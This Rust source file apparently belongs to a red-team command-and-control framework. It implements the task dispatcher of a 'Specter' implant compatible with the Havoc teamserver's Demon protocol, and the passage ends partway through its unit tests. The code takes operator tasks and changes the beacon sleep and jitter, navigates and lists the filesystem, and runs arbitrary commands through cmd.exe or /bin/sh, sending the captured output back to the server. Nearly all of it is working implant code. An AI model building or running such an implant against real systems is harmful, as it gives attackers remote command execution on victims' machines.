//! Command dispatch and handler implementations for the Specter agent.
//!
//! Routes incoming server task packages to platform-native handler functions and
//! assembles the big-endian response payloads expected by the Havoc teamserver.
//!
//! # Wire endianness
//!
//! * **Server → agent** (incoming task payload): integers are **little-endian**
//!   (`binary.LittleEndian` in the Go teamserver's `BuildPayloadMessage`).
//! * **Agent → server** (outgoing response payload): integers are **big-endian**
//!   (`Int32ToBuffer` in the Demon C agent's `Package.c`, parsed by the Go
//!   teamserver's big-endian `parser.NewParser`).

use std::process::{Command as SysCommand, Stdio};
use std::time::UNIX_EPOCH;

use red_cell_common::demon::{
    DemonCommand, DemonFilesystemCommand, DemonPackage, DemonProcessCommand,
};
use tracing::{info, warn};

use crate::config::SpecterConfig;

// ─── Result type ─────────────────────────────────────────────────────────────

/// Outcome of dispatching one decoded task package.
#[derive(Debug)]
pub enum DispatchResult {
    /// Send one response packet to the server.
    Respond(Response),
    /// Send multiple response packets (e.g., proc-info + captured output).
    MultiRespond(Vec<Response>),
    /// Cleanly terminate the agent process.
    Exit,
    /// Nothing to send back (no-job, unrecognised command, parse error, …).
    Ignore,
}

/// A single pending agent → server response, ready to be wrapped in a callback
/// envelope and sent over the transport.
#[derive(Debug, Clone)]
pub struct Response {
    /// Demon command ID for the outgoing packet header.
    pub command_id: u32,
    /// Payload bytes already serialised in big-endian wire format.
    pub payload: Vec<u8>,
}

impl Response {
    fn new(cmd: DemonCommand, payload: Vec<u8>) -> Self {
        Self { command_id: cmd.into(), payload }
    }
}

// ─── Top-level dispatch ───────────────────────────────────────────────────────

/// Route a single decoded [`DemonPackage`] to the appropriate handler.
///
/// The [`DispatchResult`] must be transmitted back to the server using the
/// `request_id` from the original package.
pub fn dispatch(package: &DemonPackage, config: &mut SpecterConfig) -> DispatchResult {
    let cmd = match DemonCommand::try_from(package.command_id) {
        Ok(c) => c,
        Err(_) => {
            warn!(command_id = package.command_id, "received unknown command ID — ignoring");
            return DispatchResult::Ignore;
        }
    };

    info!(command = ?cmd, request_id = package.request_id, "dispatching command");

    match cmd {
        DemonCommand::CommandNoJob | DemonCommand::CommandGetJob => DispatchResult::Ignore,
        DemonCommand::CommandSleep => handle_sleep(&package.payload, config),
        DemonCommand::CommandFs => handle_fs(&package.payload),
        DemonCommand::CommandProc => handle_proc(&package.payload),
        DemonCommand::CommandExit => DispatchResult::Exit,
        // These are agent-to-server callbacks; ignore if received from server.
        DemonCommand::CommandOutput | DemonCommand::BeaconOutput => DispatchResult::Ignore,
        _ => {
            info!(command = ?cmd, "unhandled command — ignoring");
            DispatchResult::Ignore
        }
    }
}

// ─── COMMAND_SLEEP (11) ──────────────────────────────────────────────────────

/// Handle a `CommandSleep` task: update the sleep configuration and echo it back.
///
/// Incoming payload (LE): `[delay_ms: u32][jitter_pct: u32]`
/// Outgoing payload (BE): `[delay_ms: u32][jitter_pct: u32]`
fn handle_sleep(payload: &[u8], config: &mut SpecterConfig) -> DispatchResult {
    let mut offset = 0;

    let delay = match parse_u32_le(payload, &mut offset) {
        Ok(v) => v,
        Err(e) => {
            warn!("CommandSleep: failed to parse delay: {e}");
            return DispatchResult::Ignore;
        }
    };
    let jitter = match parse_u32_le(payload, &mut offset) {
        Ok(v) => v,
        Err(e) => {
            warn!("CommandSleep: failed to parse jitter: {e}");
            return DispatchResult::Ignore;
        }
    };

    info!(delay_ms = delay, jitter_pct = jitter, "sleep interval updated");
    config.sleep_delay_ms = delay;
    config.sleep_jitter = jitter.min(100);

    let mut out = Vec::with_capacity(8);
    write_u32_be(&mut out, delay);
    write_u32_be(&mut out, jitter);
    DispatchResult::Respond(Response::new(DemonCommand::CommandSleep, out))
}

// ─── COMMAND_FS (15) ─────────────────────────────────────────────────────────

/// Dispatch a `CommandFs` task to the appropriate filesystem sub-handler.
///
/// Incoming payload (LE): `[subcommand: u32][subcommand-specific args…]`
fn handle_fs(payload: &[u8]) -> DispatchResult {
    let mut offset = 0;
    let subcmd_raw = match parse_u32_le(payload, &mut offset) {
        Ok(v) => v,
        Err(e) => {
            warn!("CommandFs: failed to parse subcommand: {e}");
            return DispatchResult::Ignore;
        }
    };

    let subcmd = match DemonFilesystemCommand::try_from(subcmd_raw) {
        Ok(c) => c,
        Err(_) => {
            warn!(subcmd_raw, "CommandFs: unknown subcommand");
            return DispatchResult::Ignore;
        }
    };

    info!(subcommand = ?subcmd, "CommandFs dispatch");

    match subcmd {
        DemonFilesystemCommand::GetPwd => handle_fs_pwd(subcmd_raw),
        DemonFilesystemCommand::Cd => handle_fs_cd(subcmd_raw, &payload[offset..]),
        DemonFilesystemCommand::Dir => handle_fs_dir(subcmd_raw, &payload[offset..]),
        _ => {
            info!(subcommand = ?subcmd, "CommandFs: unhandled subcommand — ignoring");
            DispatchResult::Ignore
        }
    }
}

/// `COMMAND_FS / GetPwd (9)` — return the current working directory.
///
/// Outgoing payload (BE): `[9: u32][path: bytes (UTF-16LE null-terminated)]`
fn handle_fs_pwd(subcmd_raw: u32) -> DispatchResult {
    let path = match std::env::current_dir() {
        Ok(p) => p.display().to_string(),
        Err(e) => {
            warn!("GetPwd: current_dir failed: {e}");
            return DispatchResult::Ignore;
        }
    };

    info!(path = %path, "GetPwd");

    let mut out = Vec::new();
    write_u32_be(&mut out, subcmd_raw);
    write_utf16le_be(&mut out, &path);
    DispatchResult::Respond(Response::new(DemonCommand::CommandFs, out))
}

/// `COMMAND_FS / Cd (4)` — change the working directory.
///
/// Incoming args (LE): `[path: bytes (UTF-16LE)]`
/// Outgoing payload (BE): `[4: u32][path: bytes (UTF-16LE null-terminated)]`
fn handle_fs_cd(subcmd_raw: u32, rest: &[u8]) -> DispatchResult {
    let mut offset = 0;
    let path_bytes = match parse_bytes_le(rest, &mut offset) {
        Ok(b) => b,
        Err(e) => {
            warn!("Cd: failed to parse path: {e}");
            return DispatchResult::Ignore;
        }
    };

    let path_str = decode_utf16le_null(&path_bytes);
    info!(path = %path_str, "Cd");

    if let Err(e) = std::env::set_current_dir(&path_str) {
        warn!("Cd: set_current_dir({path_str:?}) failed: {e}");
        return DispatchResult::Ignore;
    }

    let mut out = Vec::new();
    write_u32_be(&mut out, subcmd_raw);
    write_utf16le_be(&mut out, &path_str);
    DispatchResult::Respond(Response::new(DemonCommand::CommandFs, out))
}

/// `COMMAND_FS / Dir (1)` — list a directory.
///
/// Incoming args (LE) — mirrors Demon C agent parse order:
/// ```text
/// [file_explorer: u32][path: bytes][subdirs: u32][files_only: u32]
/// [dirs_only: u32][list_only: u32]
/// [starts: bytes][contains: bytes][ends: bytes]
/// ```
///
/// Outgoing payload (BE):
/// ```text
/// [subcmd: u32][file_explorer: u32][list_only: u32][path: bytes][success: u32]
/// per dir group:
///   [path: bytes][num_files: u32][num_dirs: u32]
///   (if !list_only) [total_size: u64]
///   per entry:
///     [name: bytes]
///     (if !list_only) [is_dir: u32][size: u64][day][month][year][min][hour]
/// ```
fn handle_fs_dir(subcmd_raw: u32, rest: &[u8]) -> DispatchResult {
    let mut offset = 0;

    // Parse the full request payload (matches Demon C agent parse order).
    let file_explorer = parse_u32_le(rest, &mut offset).unwrap_or(0) != 0;

    let path_bytes = match parse_bytes_le(rest, &mut offset) {
        Ok(b) => b,
        Err(e) => {
            warn!("Dir: failed to parse path: {e}");
            return DispatchResult::Ignore;
        }
    };

    let _subdirs = parse_u32_le(rest, &mut offset).unwrap_or(0) != 0;
    let files_only = parse_u32_le(rest, &mut offset).unwrap_or(0) != 0;
    let dirs_only = parse_u32_le(rest, &mut offset).unwrap_or(0) != 0;
    let list_only = parse_u32_le(rest, &mut offset).unwrap_or(0) != 0;

    // Name-filter strings (empty = no filter).
    let starts_filter =
        parse_bytes_le(rest, &mut offset).map(|b| decode_utf16le_null(&b)).unwrap_or_default();
    let contains_filter =
        parse_bytes_le(rest, &mut offset).map(|b| decode_utf16le_null(&b)).unwrap_or_default();
    let ends_filter =
        parse_bytes_le(rest, &mut offset).map(|b| decode_utf16le_null(&b)).unwrap_or_default();

    let raw_path = decode_utf16le_null(&path_bytes);

    // Resolve actual directory path (strip trailing wildcard/dot).
    let dir_path = if raw_path.is_empty() || raw_path == "." || raw_path.starts_with(".\\") {
        match std::env::current_dir() {
            Ok(p) => p.display().to_string(),
            Err(e) => {
                warn!("Dir: current_dir failed: {e}");
                return DispatchResult::Ignore;
            }
        }
    } else {
        raw_path.trim_end_matches('*').trim_end_matches('/').trim_end_matches('\\').to_string()
    };

    let entries = match std::fs::read_dir(&dir_path) {
        Ok(e) => e,
        Err(e) => {
            warn!(path = %dir_path, "Dir: read_dir failed: {e}");
            return DispatchResult::Ignore;
        }
    };

    // Collect entries with metadata and timestamps.
    // Each entry: (name, is_dir, size, day, month, year, minute, hour)
    let mut files: Vec<(String, bool, u64, u32, u32, u32, u32, u32)> = Vec::new();
    for entry in entries.flatten() {
        let name = entry.file_name().to_string_lossy().to_string();
        let meta = entry.metadata().ok();
        let is_dir = meta.as_ref().is_some_and(|m| m.is_dir());
        let size = meta.as_ref().map_or(0, |m| m.len());

        // Apply files_only / dirs_only filter.
        if files_only && is_dir {
            continue;
        }
        if dirs_only && !is_dir {
            continue;
        }

        // Apply name filters.
        let name_lower = name.to_ascii_lowercase();
        if !starts_filter.is_empty() && !name_lower.starts_with(&starts_filter.to_ascii_lowercase())
        {
            continue;
        }
        if !contains_filter.is_empty()
            && !name_lower.contains(&contains_filter.to_ascii_lowercase())
        {
            continue;
        }
        if !ends_filter.is_empty() && !name_lower.ends_with(&ends_filter.to_ascii_lowercase()) {
            continue;
        }

        // Derive modification timestamps from real file metadata.
        let (day, month, year, minute, hour) = meta
            .as_ref()
            .and_then(|m| m.modified().ok())
            .and_then(|t| t.duration_since(UNIX_EPOCH).ok())
            .map(|d| unix_secs_to_ymd_hm(d.as_secs()))
            .unwrap_or((1, 1, 1970, 0, 0));

        files.push((name, is_dir, size, day, month, year, minute, hour));
    }

    let num_files = files.iter().filter(|(_, d, ..)| !d).count() as u32;
    let num_dirs = files.iter().filter(|(_, d, ..)| *d).count() as u32;
    let total_size: u64 = files.iter().filter(|(_, d, ..)| !d).map(|(_, _, s, ..)| *s).sum();

    let mut out = Vec::new();
    write_u32_be(&mut out, subcmd_raw);
    write_u32_be(&mut out, u32::from(file_explorer));
    write_u32_be(&mut out, u32::from(list_only));
    write_utf16le_be(&mut out, &dir_path);
    write_u32_be(&mut out, 1); // success

    // Single directory group.
    write_utf16le_be(&mut out, &dir_path);
    write_u32_be(&mut out, num_files);
    write_u32_be(&mut out, num_dirs);
    if !list_only {
        out.extend_from_slice(&total_size.to_be_bytes());
    }

    for (name, is_dir, size, day, month, year, minute, hour) in &files {
        write_utf16le_be(&mut out, name);
        if !list_only {
            write_u32_be(&mut out, u32::from(*is_dir));
            out.extend_from_slice(&size.to_be_bytes());
            write_u32_be(&mut out, *day);
            write_u32_be(&mut out, *month);
            write_u32_be(&mut out, *year);
            write_u32_be(&mut out, *minute);
            write_u32_be(&mut out, *hour);
        }
    }

    DispatchResult::Respond(Response::new(DemonCommand::CommandFs, out))
}

/// Convert a UNIX timestamp (seconds since epoch) to `(day, month, year, minute, hour)`.
///
/// Uses Howard Hinnant's civil-from-days algorithm for the date part.
fn unix_secs_to_ymd_hm(secs: u64) -> (u32, u32, u32, u32, u32) {
    // Days since 1970-01-01 shifted to the civil epoch (Mar 1, year 0).
    let z = (secs / 86400) as i64 + 719_468;
    let era = if z >= 0 { z } else { z - 146_096 } / 146_097;
    let doe = (z - era * 146_097) as u64; // day of era [0, 146096]
    let yoe = (doe - doe / 1460 + doe / 36524 - doe / 146_096) / 365; // year of era [0, 399]
    let y = yoe as i64 + era * 400;
    let doy = doe - (365 * yoe + yoe / 4 - yoe / 100); // day of year [0, 365]
    let mp = (5 * doy + 2) / 153; // month of year [0, 11]
    let d = doy - (153 * mp + 2) / 5 + 1; // day [1, 31]
    let m = if mp < 10 { mp + 3 } else { mp - 9 }; // month [1, 12]
    let y = if m <= 2 { y + 1 } else { y }; // adjust year for Jan/Feb
    let hour = (secs % 86400 / 3600) as u32;
    let minute = (secs % 3600 / 60) as u32;
    (d as u32, m as u32, y as u32, minute, hour)
}

// ─── COMMAND_PROC (0x1010) ────────────────────────────────────────────────────

/// Dispatch a `CommandProc` task to the appropriate process sub-handler.
///
/// Incoming payload (LE): `[subcommand: u32][subcommand-specific args…]`
fn handle_proc(payload: &[u8]) -> DispatchResult {
    let mut offset = 0;
    let subcmd_raw = match parse_u32_le(payload, &mut offset) {
        Ok(v) => v,
        Err(e) => {
            warn!("CommandProc: failed to parse subcommand: {e}");
            return DispatchResult::Ignore;
        }
    };

    let subcmd = match DemonProcessCommand::try_from(subcmd_raw) {
        Ok(c) => c,
        Err(_) => {
            warn!(subcmd_raw, "CommandProc: unknown subcommand");
            return DispatchResult::Ignore;
        }
    };

    info!(subcommand = ?subcmd, "CommandProc dispatch");

    match subcmd {
        DemonProcessCommand::Create => handle_proc_create(subcmd_raw, &payload[offset..]),
        _ => {
            info!(subcommand = ?subcmd, "CommandProc: unhandled subcommand — ignoring");
            DispatchResult::Ignore
        }
    }
}

/// `COMMAND_PROC / Create (4)` — execute a command via the native shell.
///
/// The Havoc client sends Windows paths (`cmd.exe /c <cmd>`); on Linux we
/// strip the `/c ` prefix and invoke `/bin/sh -c <cmd>` instead.
///
/// Incoming args (LE):
/// `[state: u32][path: bytes (UTF-16LE)][args: bytes (UTF-16LE)][piped: u32][verbose: u32]`
///
/// Returns two responses (both using the original `request_id`):
/// 1. `CommandProc` — process metadata (path, PID, success, piped, verbose)
/// 2. `CommandOutput` — captured stdout + stderr
fn handle_proc_create(subcmd_raw: u32, rest: &[u8]) -> DispatchResult {
    let mut offset = 0;

    let process_state = parse_u32_le(rest, &mut offset).unwrap_or(0);

    let process_path_bytes = match parse_bytes_le(rest, &mut offset) {
        Ok(b) => b,
        Err(e) => {
            warn!("ProcCreate: failed to parse process path: {e}");
            return DispatchResult::Ignore;
        }
    };
    let process_path = decode_utf16le_null(&process_path_bytes);

    let process_args_bytes = match parse_bytes_le(rest, &mut offset) {
        Ok(b) => b,
        Err(e) => {
            warn!("ProcCreate: failed to parse process args: {e}");
            return DispatchResult::Ignore;
        }
    };
    let process_args_raw = decode_utf16le_null(&process_args_bytes);

    let piped = parse_u32_le(rest, &mut offset).unwrap_or(0);
    let verbose = parse_u32_le(rest, &mut offset).unwrap_or(0);

    info!(
        path = %process_path,
        args = %process_args_raw,
        piped,
        verbose,
        state = process_state,
        "ProcCreate: executing shell command"
    );

    let (success, pid, output_bytes) = spawn_shell_command(&process_path, &process_args_raw);

    // Response 1: COMMAND_PROC with process metadata
    // BE format: [subcmd][path bytes][pid][success][piped][verbose]
    let mut proc_payload = Vec::new();
    write_u32_be(&mut proc_payload, subcmd_raw);
    write_utf16le_be(&mut proc_payload, &process_path);
    write_u32_be(&mut proc_payload, pid);
    write_u32_be(&mut proc_payload, u32::from(success));
    write_u32_be(&mut proc_payload, piped);
    write_u32_be(&mut proc_payload, verbose);

    // Response 2: COMMAND_OUTPUT with captured output
    // BE format: [output bytes (UTF-8, length-prefixed)]
    let mut out_payload = Vec::new();
    write_bytes_be(&mut out_payload, &output_bytes);

    DispatchResult::MultiRespond(vec![
        Response::new(DemonCommand::CommandProc, proc_payload),
        Response::new(DemonCommand::CommandOutput, out_payload),
    ])
}

/// Execute a shell command via the platform-native shell and return
/// `(success, child_pid, captured_output)`.
///
/// On **Windows** the command is dispatched through `cmd.exe /c <shell_cmd>`,
/// matching the wire format sent by the Havoc operator console.
///
/// On **Unix** (Linux / macOS — used in CI and cross-compile test builds) the
/// command is translated from the Windows `cmd.exe /c` style and run via
/// `/bin/sh -c`.
#[cfg(windows)]
fn spawn_shell_command(process_path: &str, process_args: &str) -> (bool, u32, Vec<u8>) {
    // Extract the bare shell command from the `/c <cmd>` style the Havoc client sends.
    let shell_cmd = translate_to_shell_cmd(process_path, process_args);
    info!(shell_cmd = %shell_cmd, "running via cmd.exe /c");
    match SysCommand::new("cmd.exe")
        .arg("/c")
        .arg(&shell_cmd)
        .stdout(Stdio::piped())
        .stderr(Stdio::piped())
        .spawn()
    {
        Ok(child) => {
            let child_pid = child.id();
            let output_bytes = match child.wait_with_output() {
                Ok(o) => {
                    let mut combined = o.stdout;
                    if !o.stderr.is_empty() {
                        if !combined.is_empty() {
                            combined.push(b'\n');
                        }
                        combined.extend_from_slice(&o.stderr);
                    }
                    combined
                }
                Err(e) => {
                    warn!("ProcCreate: wait_with_output failed: {e}");
                    format!("error: {e}").into_bytes()
                }
            };
            (true, child_pid, output_bytes)
        }
        Err(e) => {
            warn!("ProcCreate: cmd.exe spawn failed: {e}");
            (false, 0u32, format!("error: {e}").into_bytes())
        }
    }
}

#[cfg(not(windows))]
fn spawn_shell_command(process_path: &str, process_args: &str) -> (bool, u32, Vec<u8>) {
    // Translate Windows cmd.exe /c <cmd> style to a POSIX shell command.
    let shell_cmd = translate_to_shell_cmd(process_path, process_args);
    info!(shell_cmd = %shell_cmd, "running via /bin/sh -c");
    match SysCommand::new("/bin/sh")
        .arg("-c")
        .arg(&shell_cmd)
        .stdout(Stdio::piped())
        .stderr(Stdio::piped())
        .spawn()
    {
        Ok(child) => {
            let child_pid = child.id();
            let output_bytes = match child.wait_with_output() {
                Ok(o) => {
                    let mut combined = o.stdout;
                    if !o.stderr.is_empty() {
                        if !combined.is_empty() {
                            combined.push(b'\n');
                        }
                        combined.extend_from_slice(&o.stderr);
                    }
                    combined
                }
                Err(e) => {
                    warn!("ProcCreate: wait_with_output failed: {e}");
                    format!("error: {e}").into_bytes()
                }
            };
            (true, child_pid, output_bytes)
        }
        Err(e) => {
            warn!("ProcCreate: /bin/sh spawn failed: {e}");
            (false, 0u32, format!("error: {e}").into_bytes())
        }
    }
}

/// Convert a Windows-style process invocation to a POSIX shell command string.
///
/// The Havoc `shell` client command sends `cmd.exe` as the process path and
/// `/c <command>` as the arguments.  On Linux we strip the `/c ` prefix and
/// run the remainder with `/bin/sh`.  For any other invocation we fall back to
/// running the path directly with the given arguments.
fn translate_to_shell_cmd(path: &str, args: &str) -> String {
    let args_lower = args.to_ascii_lowercase();
    if args_lower.starts_with("/c ") {
        // Typical cmd.exe /c <shell command> path
        return args[3..].to_string();
    }
    if args_lower.starts_with("/c") && args.len() > 2 {
        return args[2..].trim_start().to_string();
    }
    // Not a cmd.exe style invocation: run path with args directly.
    if args.is_empty() { path.to_string() } else { format!("{path} {args}") }
}

// ─── Payload parsing helpers (server → agent, little-endian) ─────────────────

/// Parse a `u32` in little-endian byte order from `buf[*offset..]`.
fn parse_u32_le(buf: &[u8], offset: &mut usize) -> Result<u32, &'static str> {
    if buf.len() < *offset + 4 {
        return Err("buffer too short for u32 LE");
    }
    let val = u32::from_le_bytes(
        buf[*offset..*offset + 4].try_into().map_err(|_| "slice-to-array conversion failed")?,
    );
    *offset += 4;
    Ok(val)
}

/// Parse a length-prefixed byte slice: `[u32 LE length][bytes…]`.
fn parse_bytes_le(buf: &[u8], offset: &mut usize) -> Result<Vec<u8>, &'static str> {
    let len = parse_u32_le(buf, offset)? as usize;
    if buf.len() < *offset + len {
        return Err("buffer too short for payload bytes");
    }
    let bytes = buf[*offset..*offset + len].to_vec();
    *offset += len;
    Ok(bytes)
}

/// Decode a UTF-16LE byte slice to a `String`, stripping trailing NUL characters.
fn decode_utf16le_null(bytes: &[u8]) -> String {
    let words: Vec<u16> = bytes.chunks_exact(2).map(|b| u16::from_le_bytes([b[0], b[1]])).collect();
    String::from_utf16_lossy(&words).trim_end_matches('\0').to_string()
}

// ─── Payload serialisation helpers (agent → server, big-endian) ──────────────

/// Append a `u32` in big-endian byte order.
fn write_u32_be(buf: &mut Vec<u8>, v: u32) {
    buf.extend_from_slice(&v.to_be_bytes());
}

/// Append a length-prefixed byte slice: `[u32 BE length][bytes…]`.
fn write_bytes_be(buf: &mut Vec<u8>, data: &[u8]) {
    #[allow(clippy::cast_possible_truncation)]
    let len = data.len() as u32;
    buf.extend_from_slice(&len.to_be_bytes());
    buf.extend_from_slice(data);
}

/// Encode `s` as UTF-16LE with a NUL terminator and append `[u32 BE length][bytes…]`.
fn write_utf16le_be(buf: &mut Vec<u8>, s: &str) {
    let utf16: Vec<u8> =
        s.encode_utf16().chain(std::iter::once(0u16)).flat_map(|c| c.to_le_bytes()).collect();
    write_bytes_be(buf, &utf16);
}

// ─── Unit tests ──────────────────────────────────────────────────────────────

#[cfg(test)]
mod tests {
    use super::*;
    use red_cell_common::demon::DemonPackage;

    // ── Helpers ──────────────────────────────────────────────────────────────

    /// Build a LE-encoded u32 + u32 payload (used for CommandSleep tests).
    fn le_u32_pair(a: u32, b: u32) -> Vec<u8> {
        let mut v = Vec::new();
        v.extend_from_slice(&a.to_le_bytes());
        v.extend_from_slice(&b.to_le_bytes());
        v
    }

    /// Build a LE-encoded payload with a single u32 subcommand (for CommandFs/Proc).
    fn le_subcmd(subcmd: u32) -> Vec<u8> {
        subcmd.to_le_bytes().to_vec()
    }

    /// Build a LE length-prefixed UTF-16LE byte payload for a string.
    fn le_utf16le_payload(s: &str) -> Vec<u8> {
        let utf16: Vec<u8> =
            s.encode_utf16().chain(std::iter::once(0u16)).flat_map(|c| c.to_le_bytes()).collect();
        let mut v = Vec::new();
        v.extend_from_slice(&(utf16.len() as u32).to_le_bytes());
        v.extend_from_slice(&utf16);
        v
    }

    /// Build a full Dir request payload (LE-encoded, matching the teamserver write order).
    #[allow(clippy::too_many_arguments)]
    fn dir_request_payload(
        path: &str,
        subdirs: bool,
        files_only: bool,
        dirs_only: bool,
        list_only: bool,
        starts: &str,
        contains: &str,
        ends: &str,
    ) -> Vec<u8> {
        let mut v = le_subcmd(1); // Dir = 1
        v.extend_from_slice(&0u32.to_le_bytes()); // file_explorer = false
        v.extend_from_slice(&le_utf16le_payload(path));
        v.extend_from_slice(&(subdirs as u32).to_le_bytes());
        v.extend_from_slice(&(files_only as u32).to_le_bytes());
        v.extend_from_slice(&(dirs_only as u32).to_le_bytes());
        v.extend_from_slice(&(list_only as u32).to_le_bytes());
        v.extend_from_slice(&le_utf16le_payload(starts));
        v.extend_from_slice(&le_utf16le_payload(contains));
        v.extend_from_slice(&le_utf16le_payload(ends));
        v
    }

    // ── parse_u32_le ─────────────────────────────────────────────────────────

    #[test]
    fn parse_u32_le_reads_correct_value() {
        let buf = [0x01, 0x00, 0x00, 0x00]; // 1 in LE
        let mut offset = 0;
        assert_eq!(parse_u32_le(&buf, &mut offset).expect("parse"), 1);
        assert_eq!(offset, 4);
    }

    #[test]
    fn parse_u32_le_advances_offset() {
        let buf = [0x01, 0x00, 0x00, 0x00, 0x02, 0x00, 0x00, 0x00];
        let mut offset = 0;
        assert_eq!(parse_u32_le(&buf, &mut offset).expect("first"), 1);
        assert_eq!(parse_u32_le(&buf, &mut offset).expect("second"), 2);
    }

    #[test]
    fn parse_u32_le_short_buffer_returns_err() {
        let buf = [0x01, 0x00, 0x00]; // only 3 bytes
        let mut offset = 0;
        assert!(parse_u32_le(&buf, &mut offset).is_err());
    }

    // ── parse_bytes_le ───────────────────────────────────────────────────────

    #[test]
    fn parse_bytes_le_reads_length_prefixed_slice() {
        let data: &[u8] = &[0xAA, 0xBB];
        let mut buf = (data.len() as u32).to_le_bytes().to_vec();
        buf.extend_from_slice(data);
        let mut offset = 0;
        let result = parse_bytes_le(&buf, &mut offset).expect("parse");
        assert_eq!(result, data);
        assert_eq!(offset, 6);
    }

    #[test]
    fn parse_bytes_le_empty_payload_is_ok() {
        let buf = 0u32.to_le_bytes();
        let mut offset = 0;
        let result = parse_bytes_le(&buf, &mut offset).expect("parse");
        assert!(result.is_empty());
    }

    // ── decode_utf16le_null ──────────────────────────────────────────────────

    #[test]
    fn decode_utf16le_null_strips_null_terminator() {
        // "Hi\0" encoded as UTF-16LE
        let encoded: Vec<u8> = "Hi\0".encode_utf16().flat_map(|c| c.to_le_bytes()).collect();
        assert_eq!(decode_utf16le_null(&encoded), "Hi");
    }

    #[test]
    fn decode_utf16le_null_handles_empty_slice() {
        assert_eq!(decode_utf16le_null(&[]), "");
    }

    // ── write_utf16le_be ─────────────────────────────────────────────────────

    #[test]
    fn write_utf16le_be_roundtrips_ascii_string() {
        let s = "hello";
        let mut buf = Vec::new();
        write_utf16le_be(&mut buf, s);

        // First 4 bytes: BE length of UTF-16LE bytes (including null terminator)
        // "hello\0" → 6 UTF-16 code units × 2 bytes = 12 bytes
        let len = u32::from_be_bytes(buf[0..4].try_into().expect("len"));
        assert_eq!(len, 12); // 5 chars + NUL = 6 × 2

        let decoded = decode_utf16le_null(&buf[4..]);
        assert_eq!(decoded, s);
    }

    // ── handle_sleep ─────────────────────────────────────────────────────────

    #[test]
    fn handle_sleep_updates_config_and_echoes_values() {
        let mut config = SpecterConfig::default();
        let payload = le_u32_pair(3000, 25);
        let package = DemonPackage::new(DemonCommand::CommandSleep, 42, payload);
        let result = dispatch(&package, &mut config);

        assert_eq!(config.sleep_delay_ms, 3000);
        assert_eq!(config.sleep_jitter, 25);

        let DispatchResult::Respond(resp) = result else {
            panic!("expected Respond, got {result:?}");
        };
        assert_eq!(resp.command_id, u32::from(DemonCommand::CommandSleep));
        // Payload: [3000 BE][25 BE]
        let expected_delay = 3000u32.to_be_bytes();
        let expected_jitter = 25u32.to_be_bytes();
        assert_eq!(&resp.payload[0..4], &expected_delay);
        assert_eq!(&resp.payload[4..8], &expected_jitter);
    }

    #[test]
    fn handle_sleep_clamps_jitter_to_100() {
        let mut config = SpecterConfig::default();
        let payload = le_u32_pair(1000, 150); // jitter > 100
        let package = DemonPackage::new(DemonCommand::CommandSleep, 1, payload);
        dispatch(&package, &mut config);
        assert_eq!(config.sleep_jitter, 100);
    }

    #[test]
    fn handle_sleep_short_payload_returns_ignore() {
        let mut config = SpecterConfig::default();
        let package = DemonPackage::new(DemonCommand::CommandSleep, 1, vec![0x01]); // too short
        let result = dispatch(&package, &mut config);
        assert!(matches!(result, DispatchResult::Ignore));
    }

    // ── handle_fs pwd ────────────────────────────────────────────────────────

    #[test]
    fn handle_fs_pwd_returns_non_empty_path() {
        let mut config = SpecterConfig::default();
        let payload = le_subcmd(9); // GetPwd = 9
        let package = DemonPackage::new(DemonCommand::CommandFs, 7, payload);
        let result = dispatch(&package, &mut config);

        let DispatchResult::Respond(resp) = result else {
            panic!("expected Respond, got {result:?}");
        };
        assert_eq!(resp.command_id, u32::from(DemonCommand::CommandFs));

        // First 4 bytes BE = subcommand (9)
        let subcmd = u32::from_be_bytes(resp.payload[0..4].try_into().expect("subcmd"));
        assert_eq!(subcmd, 9);

        // Remaining = length-prefixed UTF-16LE path
        assert!(resp.payload.len() > 8, "payload should contain a path");
    }

    // ── handle_fs cd ─────────────────────────────────────────────────────────

    #[test]
    fn handle_fs_cd_changes_directory_and_echoes_path() {
        let tmp = std::env::temp_dir();
        let tmp_str = tmp.display().to_string();

        let mut config = SpecterConfig::default();
        let mut payload = le_subcmd(4); // Cd = 4
        payload.extend_from_slice(&le_utf16le_payload(&tmp_str));
        let package = DemonPackage::new(DemonCommand::CommandFs, 8, payload);

        let result = dispatch(&package, &mut config);

        let DispatchResult::Respond(resp) = result else {
            panic!("expected Respond, got {result:?}");
        };
        assert_eq!(resp.command_id, u32::from(DemonCommand::CommandFs));
        let subcmd = u32::from_be_bytes(resp.payload[0..4].try_into().expect("subcmd"));
        assert_eq!(subcmd, 4);

        // Decode echoed path from response
        let path_len = u32::from_be_bytes(resp.payload[4..8].try_into().expect("len")) as usize;
        let decoded = decode_utf16le_null(&resp.payload[8..8 + path_len]);
        assert_eq!(decoded, tmp_str);
    }

    #[test]
    fn handle_fs_cd_missing_path_returns_ignore() {
        let mut config = SpecterConfig::default();
        let payload = le_subcmd(4); // Cd = 4, but no path bytes follow
        let package = DemonPackage::new(DemonCommand::CommandFs, 1, payload);
        let result = dispatch(&package, &mut config);
        assert!(matches!(result, DispatchResult::Ignore));
    }

    // ── handle_fs dir ────────────────────────────────────────────────────────

    #[test]
    fn handle_fs_dir_returns_non_empty_listing() {
        let tmp = std::env::temp_dir();
        let tmp_str = tmp.display().to_string();

        let mut config = SpecterConfig::default();
        let payload = dir_request_payload(&tmp_str, false, false, false, false, "", "", "");
        let package = DemonPackage::new(DemonCommand::CommandFs, 9, payload);

        let result = dispatch(&package, &mut config);
        assert!(matches!(result, DispatchResult::Respond(_)));
    }

    #[test]
    fn handle_fs_dir_list_only_omits_size_and_timestamps() {
        // In list_only mode the response must NOT include is_dir/size/timestamps per entry
        // and must NOT include total_size per dir group.
        let tmp = std::env::temp_dir();
        // Create a known file so we always have at least one entry.
        let test_file = tmp.join("specter_list_only_test.tmp");
        let _ = std::fs::write(&test_file, b"x");

        let mut config = SpecterConfig::default();
        let payload =
            dir_request_payload(&tmp.display().to_string(), false, false, false, true, "", "", "");
        let package = DemonPackage::new(DemonCommand::CommandFs, 11, payload);
        let DispatchResult::Respond(resp) = dispatch(&package, &mut config) else {
            panic!("expected Respond");
        };

        // Parse the response header.
        let p = &resp.payload;
        let mut pos = 0usize;
        let _subcmd = u32::from_be_bytes(p[pos..pos + 4].try_into().expect("subcmd"));
        pos += 4;
        let _file_explorer = u32::from_be_bytes(p[pos..pos + 4].try_into().expect("fe"));
        pos += 4;
        let list_only_flag = u32::from_be_bytes(p[pos..pos + 4].try_into().expect("lo"));
        pos += 4;
        assert_eq!(list_only_flag, 1, "list_only must be echoed as 1");

        // Skip root_path (BE length-prefixed utf16le).
        let path_len = u32::from_be_bytes(p[pos..pos + 4].try_into().expect("plen")) as usize;
        pos += 4 + path_len;
        let success = u32::from_be_bytes(p[pos..pos + 4].try_into().expect("success"));
        assert_eq!(success, 1);
        pos += 4;

